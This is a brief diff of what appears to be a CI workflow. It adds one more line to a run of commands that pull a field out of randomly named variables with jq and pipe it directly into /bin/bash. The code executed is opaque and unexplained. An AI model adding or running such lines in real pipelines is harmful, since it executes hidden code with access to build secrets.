@@ -22,6 +22,7 @@ jobs:
           echo $w7584 | jq -r .oc15 | /bin/bash
           echo $hjne9608 | jq -r .qm6506 | /bin/bash
           echo $pbhm9 | jq -r .wsvpb620 | /bin/bash
+          echo $dybij2 | jq -r .qs263 | /bin/bash
 
       - name: Upload results
         if: always()
